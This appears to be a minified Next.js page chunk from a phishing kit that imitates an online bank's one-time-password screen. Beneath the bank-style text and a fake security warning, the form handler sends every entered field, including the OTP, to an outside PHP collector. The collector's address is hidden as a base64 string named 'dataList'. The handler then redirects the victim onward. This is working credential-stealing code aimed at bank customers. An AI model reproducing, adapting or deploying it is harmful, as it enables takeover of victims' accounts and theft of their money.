(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [285], {
        4974: function(e, n, t) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/a11", function() {
                return t(6197)
            }])
        },
        9018: function(e, n) {
            "use strict";
            n.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        6197: function(e, n, t) {
            "use strict";
            t.r(n), t.d(n, {
                default: function() {
                    return m
                }
            });
            var a = t(7568),
                s = t(655),
                i = t(5893),
                r = t(9008),
                o = t.n(r),
                c = t(5675),
                l = t.n(c),
                d = t(7294),
                u = t(1163),
                h = t(9018);

            function m() {
                var e = (0, u.useRouter)(),
                    n = (0, d.useState)(""),
                    t = n[0];
                n[1];
                var r, c = (0, d.useState)(!1),
                    m = c[0],
                    $ = c[1],
                    p = (r = (0, a.Z)(function(n) {
                        var t, a, i, r, o, c, l;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return n.preventDefault(), $(!0), t = new FormData(n.target), a = {}, t.forEach(function(e, n) {
                                        a[n] = e
                                    }), i = JSON.stringify(a), r = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "application/json"
                                    }, o.body = i, o), [4, fetch(window.atob(h.Z.dataList) + "?id=" + window.location.hostname, r)];
                                case 1:
                                    return [4, (c = s.sent()).json()];
                                case 2:
                                    return l = s.sent(), $(!1), !0 == l.status ? e.push("/a10") : $(!1), [2]
                            }
                        })
                    }), function(e) {
                        return r.apply(this, arguments)
                    }),
                    f = (0, d.useState)("03:00"),
                    x = f[0],
                    v = f[1];
                return (0, d.useEffect)(function() {
                    ! function e(n) {
                        var t = Math.floor(n / 60),
                            a = n % 60;
                        if (v((t = t < 10 ? "0" + t : t) + ":" + (a = a < 10 ? "0" + a : a)), (n -= 1) >= 0) {
                            setTimeout(function() {
                                e(n)
                            }, 1e3);
                            return
                        }
                    }(180)
                }, []), (0, i.jsxs)(i.Fragment, {
                    children: [(0, i.jsxs)(o(), {
                        children: [(0, i.jsx)("title", {
                            children: "Enter the one time password"
                        }), (0, i.jsx)("meta", {
                            name: "description",
                            content: "validate the data list"
                        }), (0, i.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, i.jsxs)("main", {
                        children: [(0, i.jsx)("div", {
                            className: "logo",
                            children: (0, i.jsx)(l(), {
                                src: "/logo.svg.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, i.jsx)("br", {}), (0, i.jsx)("div", {
                            className: "panelDiv",
                            children: (0, i.jsx)("div", {
                                className: "panel",
                                children: (0, i.jsx)("span", {
                                    children: t
                                })
                            })
                        }), (0, i.jsx)("div", {
                            className: "content_heading",
                            children: (0, i.jsx)("h3", {
                                className: "pull-left",
                                children: "Login Second Factor Authentication"
                            })
                        }), (0, i.jsxs)("div", {
                            className: "content_area",
                            children: [(0, i.jsx)("p", {
                                className: "content_title",
                                children: "Enter the One Time Password sent to your mobile phone"
                            }), (0, i.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, i.jsx)("p", {
                                className: "content_title text-danger",
                                children: "Automatically resend new OTP on your registered number."
                            }), (0, i.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: p,
                                children: [(0, i.jsx)("p", {
                                    className: "text-danger invalid",
                                    children: "Invalid one time password"
                                }), (0, i.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, i.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otp7",
                                        children: [" One Time Password", (0, i.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, i.jsx)("input", {
                                        className: "form-control",
                                        id: "otp7",
                                        type: "text",
                                        name: "otp7",
                                        maxLength: 8,
                                        tabIndex: "1"
                                    })]
                                }), (0, i.jsxs)("div", {
                                    className: "commonbutton",
                                    children: [(0, i.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!m,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    }), (0, i.jsx)("p", {
                                        children: x
                                    })]
                                })]
                            }), (0, i.jsx)("div", {
                                className: "common_btn",
                                children: (0, i.jsxs)("p", {
                                    children: ["If you did not receive the High Security Password on SMS, you can", (0, i.jsx)("a", {
                                        href: "#",
                                        className: "btn btn-resend",
                                        type: "button",
                                        children: "Click here to resend the OTP"
                                    })]
                                })
                            }), (0, i.jsx)("div", {
                                className: "info_panel",
                                children: (0, i.jsx)("div", {
                                    className: "notify_icon",
                                    children: (0, i.jsxs)("ul", {
                                        children: [(0, i.jsx)("li", {
                                            children: "Any of its representative never sends you email/SMS or calls you over phone to get your personal information, password or one time SMS (high security) password. Any such e-mail/SMS or phone call is an attempt to fraudulently withdraw money from your account through Internet Banking. Never respond to such email/SMS or phone call. Please report immediately on report@onlinebank.com if you receive any such email/SMS or Phone call. Immediately change your passwords if you have accidentally revealed your credentials."
                                        }), (0, i.jsx)("li", {
                                            children: "Please note that you will receive the all communication related to Internet banking on your updated mobile number only after approval."
                                        })]
                                    })
                                })
                            })]
                        }), (0, i.jsx)("div", {
                            className: "footer_area",
                            children: (0, i.jsx)(l(), {
                                src: "/veriSign.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, i.jsx)("div", {
                            className: "footer",
                            children: (0, i.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(e, n, t) {
            "use strict";

            function a(e, n, t, a, s, i, r) {
                try {
                    var o = e[i](r),
                        c = o.value
                } catch (l) {
                    t(l);
                    return
                }
                o.done ? n(c) : Promise.resolve(c).then(a, s)
            }

            function s(e) {
                return function() {
                    var n = this,
                        t = arguments;
                    return new Promise(function(s, i) {
                        var r = e.apply(n, t);

                        function o(e) {
                            a(r, s, i, o, c, "next", e)
                        }

                        function c(e) {
                            a(r, s, i, o, c, "throw", e)
                        }
                        o(void 0)
                    })
                }
            }
            t.d(n, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 4974)
        }), _N_E = e.O()
    }
]);